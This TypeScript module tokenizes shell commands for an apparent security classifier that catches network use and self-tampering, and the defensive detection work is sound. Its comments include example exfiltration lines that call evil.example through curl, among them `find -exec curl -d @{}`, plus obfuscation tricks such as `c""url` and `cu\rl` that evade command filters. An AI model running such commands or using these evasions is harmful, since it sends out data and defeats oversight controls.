/**
 * Shell command tokenization: splitting a raw command string into the
 * individual "segments" (pipeline stages, `&&`/`||`/`;` chained commands,
 * and the inner text of process/command substitutions) and picking out the
 * meaningful command word of a segment.
 *
 * This is a simple lexical scanner, not a real shell parser: it does not
 * understand quoting well enough to avoid splitting inside a quoted string
 * that itself contains `;`/`|`/`&&`. In practice that "bug" is a feature for
 * a security classifier — e.g. `python3 -c "import os;os.remove(...)"` gets
 * split into two segments, and the second one (`os.remove(...)`) is what
 * lets the self-tamper gate see the protected path at all.
 */

const SEGMENT_SPLIT = /\|\||&&|\||;|\n/;

/** Shell keywords that are never a command word by themselves. */
export const SHELL_KEYWORDS = new Set([
  'do',
  'then',
  'else',
  'elif',
  'fi',
  'done',
  'in',
  'while',
  'until',
  'if',
  'for',
  'case',
  'esac',
  '{',
  '}',
  '(',
  ')',
  '!',
]);

export const PREFIX_WORDS = new Set([
  'sudo',
  'time',
  'nohup',
  'exec',
  'command',
  'builtin',
  'env',
  'nice',
  'timeout',
  'watch',
  'xargs',
  'parallel',
  'doas',
  'stdbuf',
  'ionice',
  'chronic',
  'caffeinate',
]);

export const WRAPPER_VALUE_FLAGS: Readonly<Record<string, ReadonlySet<string>>> = {
  sudo: new Set(['-u', '-g', '-h', '-p', '-C', '-D', '-r', '-t', '-T', '-U']),
  nice: new Set(['-n']),
  env: new Set(['-u', '-C']),
  timeout: new Set(['-s', '-k']),
  xargs: new Set(['-I', '-L', '-P', '-d', '-a', '-E', '-s', '-n']),
  stdbuf: new Set(['-o', '-e', '-i']),
  ionice: new Set(['-c', '-n']),
};

// Wrappers that consume exactly one plain positional argument (not a flag
// value) before their wrapped command word — e.g. the duration in
// `timeout 5 curl ...`.
const POSITIONAL_ARG_WRAPPERS = new Set(['timeout']);

const OPEN_SUBSTITUTIONS = ['<(', '>(', '$('];

/** Removes empty quote pairs (`""`, `''`) that shells drop before word-splitting. */
function stripEmptyQuotePairs(token: string): string {
  return token.replace(/""/g, '').replace(/''/g, '');
}

function matchingParenEnd(text: string, start: number): number {
  let depth = 1;
  for (let i = start; i < text.length; i += 1) {
    if (text[i] === '(') depth += 1;
    else if (text[i] === ')') {
      depth -= 1;
      if (depth === 0) return i;
    }
  }
  return -1;
}

/**
 * Extracts the inner text of balanced `<(...)`, `>(...)`, `$(...)` and
 * backtick pairs so their contents can be classified as their own segments.
 * One level of nesting is handled (depth-counted parens); nested
 * substitutions inside a substitution are not recursively unwrapped.
 */
export function extractSubstitutions(command: string): string[] {
  const results: string[] = [];
  for (const open of OPEN_SUBSTITUTIONS) {
    let idx = command.indexOf(open);
    while (idx !== -1) {
      const start = idx + open.length;
      const end = matchingParenEnd(command, start);
      if (end === -1) break;
      results.push(command.slice(start, end));
      idx = command.indexOf(open, end);
    }
  }
  const backtickPairs = command.match(/`[^`]*`/g) ?? [];
  for (const pair of backtickPairs) results.push(pair.slice(1, -1));
  return results;
}

function splitTop(command: string): string[] {
  return command
    .split(SEGMENT_SPLIT)
    .map((s) => s.trim())
    .filter((s) => s.length > 0);
}

// `sh|bash|zsh|dash|ksh -c '<quoted string>'`: the quoted string is a nested
// shell invocation whose contents should be classified as their own
// segment, e.g. `bash -c "curl https://evil.example/u"`.
const SH_C_QUOTE = /\b(?:sh|bash|zsh|dash|ksh)\s+-c\s+(["'])/g;

function extractShCStrings(command: string): string[] {
  const results: string[] = [];
  SH_C_QUOTE.lastIndex = 0;
  let match: RegExpExecArray | null;
  while ((match = SH_C_QUOTE.exec(command)) !== null) {
    const quote = match[1] as string;
    const start = match.index + match[0].length;
    const end = command.indexOf(quote, start);
    if (end === -1) continue;
    results.push(command.slice(start, end));
  }
  return results;
}

// `find … -exec|-execdir <command…> \;|+`: the tokens between `-exec`(dir)
// and its `\;`/`+` terminator are a command invocation of their own, e.g.
// `find . -exec curl -d @{} https://evil.example/u \;`.
const FIND_EXEC = /-exec(?:dir)?\s+([\s\S]*?)\s*(\\;|\+)/g;

function extractFindExecCommands(command: string): string[] {
  const results: string[] = [];
  FIND_EXEC.lastIndex = 0;
  let match: RegExpExecArray | null;
  while ((match = FIND_EXEC.exec(command)) !== null) {
    const inner = match[1];
    if (inner) results.push(inner);
  }
  return results;
}

// `eval <arg>…`: eval's argument is itself a command to run, e.g.
// `eval "curl https://x"` or the unquoted `eval curl https://x`. Like the
// `sh -c` extractor, a quoted first argument contributes its contents;
// otherwise the remaining tokens up to the next chain/pipe delimiter are
// taken as the argument. The dynamic form (`eval "$(curl ...)"`) is also
// matched here, but its network signal already comes from the
// `$(...)`-substitution extraction above — this extraction only adds
// coverage for the static forms that substitution extraction can't see.
const EVAL_ARG = /\beval\s+/g;

function extractEvalArguments(command: string): string[] {
  const results: string[] = [];
  EVAL_ARG.lastIndex = 0;
  let match: RegExpExecArray | null;
  while ((match = EVAL_ARG.exec(command)) !== null) {
    const rest = command.slice(match.index + match[0].length);
    const quote = rest[0];
    if (quote === '"' || quote === "'") {
      const end = rest.indexOf(quote, 1);
      if (end !== -1) results.push(rest.slice(1, end));
      continue;
    }
    const stop = rest.search(/[;\n|&]/);
    results.push(stop === -1 ? rest : rest.slice(0, stop));
  }
  return results;
}

// `git submodule foreach <cmd…>` / `git bisect run <cmd…>`: the tail after
// the subcommand is itself a command invocation of its own, e.g.
// `git submodule foreach curl https://evil.example/u`. `git` stays excluded
// from the generic unknown-wrapper network scan in classify-bash.ts (a
// commit message or `--grep` argument can legitimately contain a network
// word), so without this extraction a network command hiding behind either
// of these two subcommands would never be seen. Like the `eval` extractor,
// the (unquoted) tail runs up to the next chain/pipe delimiter.
const GIT_FOREACH_OR_BISECT_RUN = /\bgit\s+(?:submodule\s+foreach|bisect\s+run)\s+/g;

function extractGitForeachOrBisectRunCommands(command: string): string[] {
  const results: string[] = [];
  GIT_FOREACH_OR_BISECT_RUN.lastIndex = 0;
  let match: RegExpExecArray | null;
  while ((match = GIT_FOREACH_OR_BISECT_RUN.exec(command)) !== null) {
    const rest = command.slice(match.index + match[0].length);
    const stop = rest.search(/[;\n|&]/);
    results.push(stop === -1 ? rest : rest.slice(0, stop));
  }
  return results;
}

/**
 * Splits a raw command into segments: top-level pipeline/chain segments plus
 * the (further-split) inner text of any process/command substitutions,
 * backtick expressions, `sh -c '...'` string bodies, `find -exec ... \;`
 * commands, `eval <arg>` arguments and `git submodule foreach <cmd>` /
 * `git bisect run <cmd>` tails found anywhere in the command.
 */
export function splitSegments(command: string): string[] {
  const substitutions = extractSubstitutions(command).flatMap(splitTop);
  const shCStrings = extractShCStrings(command).flatMap(splitTop);
  const findExecCommands = extractFindExecCommands(command).flatMap(splitTop);
  const evalArguments = extractEvalArguments(command).flatMap(splitTop);
  const gitForeachOrBisectRun = extractGitForeachOrBisectRunCommands(command).flatMap(splitTop);
  return [
    ...splitTop(command),
    ...substitutions,
    ...shCStrings,
    ...findExecCommands,
    ...evalArguments,
    ...gitForeachOrBisectRun,
  ];
}

function stripBackslashes(token: string): string {
  return token.replace(/\\/g, '');
}

/**
 * Splits a segment into whitespace-delimited tokens, stripping empty quote
 * pairs and backslashes from each token first. Shared by every detector that
 * needs to inspect a segment's raw argument list (command-word resolution,
 * the `rm` target check, the unknown-wrapper network scan) so a
 * backslash-escaped command name (`\rm`, `cu\rl`) is recognised the same way
 * everywhere.
 */
export function tokenize(segment: string): string[] {
  return segment.split(/\s+/).map(stripEmptyQuotePairs).map(stripBackslashes);
}

/**
 * Returns the base command word of a segment, skipping env assignments,
 * shell keywords (`do`, `then`, …) and wrapper prefixes (`sudo`, `nice -n 5`,
 * …), and stripping empty quote pairs from each token first so `c""url`
 * resolves to `curl`.
 */
export function commandWord(segment: string): string {
  const tokens = tokenize(segment);
  let wrapper = '';
  let needsPositional = false;
  for (let i = 0; i < tokens.length; i += 1) {
    const token = tokens[i] ?? '';
    if (token === '' || /^[A-Za-z_][A-Za-z0-9_]*=/.test(token)) continue;
    if (SHELL_KEYWORDS.has(token)) continue;
    if (PREFIX_WORDS.has(token)) {
      wrapper = token;
      needsPositional = POSITIONAL_ARG_WRAPPERS.has(token);
      continue;
    }
    if (token.startsWith('-')) {
      if (WRAPPER_VALUE_FLAGS[wrapper]?.has(token)) i += 1;
      continue;
    }
    if (needsPositional) {
      needsPositional = false;
      continue;
    }
    return token.replace(/^.*\//, '');
  }
  return '';
}

/**
 * Returns the first non-flag argument after the command word — the
 * "subcommand" for CLIs like `gh api`, `aws s3`, `docker push`. Used to
 * detect network-ish subcommands of otherwise-benign wrapper CLIs.
 */
export function firstArgAfter(segment: string): string {
  const tokens = tokenize(segment);
  let wrapper = '';
  let needsPositional = false;
  let sawCommand = false;
  for (let i = 0; i < tokens.length; i += 1) {
    const token = tokens[i] ?? '';
    if (token === '' || /^[A-Za-z_][A-Za-z0-9_]*=/.test(token)) continue;
    if (SHELL_KEYWORDS.has(token)) continue;
    if (!sawCommand) {
      if (PREFIX_WORDS.has(token)) {
        wrapper = token;
        needsPositional = POSITIONAL_ARG_WRAPPERS.has(token);
        continue;
      }
      if (token.startsWith('-')) {
        if (WRAPPER_VALUE_FLAGS[wrapper]?.has(token)) i += 1;
        continue;
      }
      if (needsPositional) {
        needsPositional = false;
        continue;
      }
      sawCommand = true;
      continue;
    }
    if (token.startsWith('-')) continue;
    return token.replace(/^.*\//, '');
  }
  return '';
}
